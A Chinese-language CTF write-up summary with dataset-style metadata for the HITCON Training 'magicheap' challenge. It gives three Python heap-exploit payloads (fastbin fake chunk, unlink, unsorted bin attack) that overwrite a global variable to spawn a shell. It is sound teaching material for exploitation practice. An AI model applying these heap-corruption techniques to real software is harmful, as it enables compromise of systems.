---
title: Hitcontraining magicheap 完整三解
contest: HITCON Training
year: 2018
difficulty: medium
vuln_type: heap_exploit
tags: [fastbin, tcache, unlink, unsorted bin, libc-2.23]
attack_chain: |
  1. 三种姿势覆盖 magic 全局 (0x6020a0) 触发 l33t()=system("/bin/sh") 输入菜单 4869
  2. 解法一 tcache dup: alloc(0x60)+alloc(0x60)+free(1) 0x68 padding + p64(0x71) fake size + p64(0x60208d) fastbin fd 指向 0x21 fake chunk 头 → 再 alloc 拿到 fake chunk 写 magic
  3. 解法二 unlink: alloc(0x60)+alloc(0x80) 在 chunk0 内伪造 fake chunk (presize 0/size 0x20/fd=heaparray-0x18/bk=heaparray-0x10) 绕过 FD->bk != P 检查 → free(1) 触发 unlink → heaparray 指向自身 → fill(0) 写 magic
  4. 解法三 unsorted bin unlink: alloc(0x60)+alloc(0x80)+alloc(0x80) chunk1 size 0x90+fd=0+fd_nextsize=bk=magic-0x10 → free(1) → alloc(0x80) 触发 unlink → fill(0) 写 magic
key_payload: |
  fill(0, payload)  # 把 magic 全局写 > 0x1305
  getshell()        # 菜单输入 4869 → l33t() → system("/bin/sh")
one_liner: HITCON 训练场经典 single-null 指针堆菜单，三种姿势教 unlink 怎么用。
lesson: heaparray/magic 都是全局变量，fastbin attack 0x21 fake chunk 头、unlink 双向链表 fd/bk 自引用检查、unsorted bin unlink 三套模板都要会背。
quality: high
---

# Hitcontraining magicheap 完整三解

> 来源: ctfiot.com 293125 - 看雪论坛 G0t1T 原创

## 题目

`main` 是经典堆菜单 1.create/2.edit/3.delete/4.exit/4869.shell，菜单 4869 触发 `l33t()=system("/bin/sh")`，前置条件是全局 `magic > 0x1305`：

```c
if( v3 == 4869) {
    if( (unsigned __int64)magic <= 0x1305) puts("So sad !");
    else { puts("Congrt !"); l33t(); }
}
```

- `heaparray[10]` 存 0x6020c0
- `magic` 存 0x6020a0
- `edit_heap` 没有 size 限制也没有 off-by-null 校验

## 三种解法

### 解法一：tcache + fastbin attack 0x21 fake chunk 头

```python
allocate(0x60, b'aaa')  # chunk0
allocate(0x60, b'aaa')  # chunk1
free(1)
# 修改 chunk1 的 fd 指向 0x60208d (fake chunk 头 size=0x21 在 magic 附近)
payload = b'a'*0x68 + p64(0x71) + p64(0x60208d)
fill(0, payload)
allocate(0x60, b'aaa')  # 取出 chunk1
allocate(0x60, b'\xff'*0x8)  # 拿到 fake chunk，写 magic
```

### 解法二：unlink 双向链表

```python
heaparray = 0x6020C0
magic = 0x6020A0
allocate(0x60, b'aaa')
allocate(0x80, b'aaa')

# 在 chunk0 内伪造 fake chunk
payload  = p64(0)         # presize
payload += p64(0x20)      # size (inuse=1)
payload += p64(heaparray-0x18)  # fd (绕过 FD->bk==P 检查)
payload += p64(heaparray-0x10)  # bk
payload += p64(0x20)      # 绕过 next_chunk->prev_size==chunksize(P) 检查
payload  = payload.ljust(0x60, b'a')
payload += p64(0x60)      # chunk1 presize
payload += p64(0x90)      # chunk1 size 抹掉 inuse 位
fill(0, payload)

free(1)  # 触发 unlink → heaparray 指向自身

# 此时 fill(0) 等于 fill(*heaparray) = write heaparray
payload = b'a'*0x18 + p64(magic)
fill(0, payload)
fill(0, p64(0xdeadbeaf))  # 改 magic
```

### 解法三：unsorted bin unlink

```python
allocate(0x60, b'aaa')   # chunk0
allocate(0x80, b'aaa')   # chunk1
allocate(0x80, b'aaa')   # chunk2
free(1)

payload  = b'a'*0x68
payload += p64(0x90)              # chunk1 size
payload += p64(0)                 # fd
payload += p64(magic - 0x10)      # bk
fill(0, payload)

allocate(0x80, b'aaa')  # 触发 unsorted bin unlink
```

## 评价

是看雪 G0t1T 写的高质量训练场讲解，把同一个题目三个不同解法铺开，等于把 libc 2.23 的 fastbin / smallbin unlink / unsorted bin unlink 三套模板都用一遍。remote 端是 node5.buuoj.cn:28312，直接 pwntools remote 跑通。

`l33t()=system("/bin/sh")` 的设计让题不需要真的 leak 拿到 shell，只需要把 magic 全局变量覆盖过 0x1305，门槛低、思路多，是很适合入门的训练场。
